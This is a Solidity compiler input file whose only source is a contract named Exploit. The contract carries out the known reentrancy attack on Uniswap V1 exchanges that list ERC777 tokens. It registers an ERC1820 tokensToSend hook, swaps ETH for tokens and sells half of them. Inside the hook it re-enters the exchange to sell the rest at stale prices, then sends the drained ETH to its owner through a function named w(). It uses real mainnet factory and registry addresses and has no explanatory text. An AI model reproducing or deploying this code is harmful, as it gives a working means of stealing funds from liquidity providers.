{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"browser/3_Ballot.sol":{"content":"pragma solidity >=0.4.22 <0.7.0;\r\n\r\n\r\ninterface Uniswap_Factory {\r\n    function getExchange(address token) external returns (address);\r\n    function getToken(address token) external returns (address);\r\n    function getTokenWithId(uint256 token_id) external returns (address);\r\n}\r\n\r\ninterface Uniswap_Exchange {\r\n    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline) external payable returns (uint256);\r\n    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);\r\n}\r\n\r\ninterface IERC20 {\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n}\r\n\r\n\r\ninterface IERC777Sender {\r\n    function tokensToSend(\r\n        address operator,\r\n        address from,\r\n        address to,\r\n        uint amount,\r\n        bytes calldata userData,\r\n        bytes calldata operatorData\r\n    ) external;\r\n}\r\n\r\ninterface IERC1820Registry {\r\n    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;\r\n}\r\n\r\ncontract Exploit is IERC777Sender {\r\n\r\n    bytes32 constant private TOKENS_SENDER_INTERFACE_HASH =\r\n        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;\r\n    IERC1820Registry private _erc1820_registry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);\r\n        \r\n    address payable private _owner;\r\n\r\n    Uniswap_Factory uniswap_factory = Uniswap_Factory(0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95);\r\n    uint256 approval = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\r\n    uint256 private token_left = 0;\r\n    \r\n    constructor() public {\r\n        _owner = msg.sender;\r\n        _erc1820_registry.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));\r\n    }\r\n    \r\n    function execute(address token) external payable {\r\n        require(msg.sender == _owner, \"only admin\");\r\n        Uniswap_Exchange exchange = Uniswap_Exchange(uniswap_factory.getExchange(token));\r\n        uint256 tokens_bought = exchange.ethToTokenSwapInput.value(msg.value)(1, approval);\r\n\r\n        IERC20(token).approve(address(exchange), approval);\r\n        \r\n        uint256 send_token = tokens_bought / 2;\r\n        token_left = tokens_bought - send_token;\r\n        \r\n        exchange.tokenToEthSwapInput(send_token, 1, approval);\r\n        \r\n    }\r\n    \r\n    fallback() external payable {\r\n    }  \r\n    \r\n    function tokensToSend(address operator, address from, address to, uint amount, bytes calldata userData, bytes calldata operatorData) external override {\r\n        if(address(from) == address(this) && token_left != 0){\r\n            uint256 tmp = token_left;\r\n            token_left = 0;\r\n            Uniswap_Exchange(operator).tokenToEthSwapInput(tmp, 1, approval);\r\n        } else {\r\n            return;\r\n        }\r\n    }\r\n    \r\n    function w() external {\r\n        _owner.transfer(address(this).balance);\r\n    }\r\n}"}}}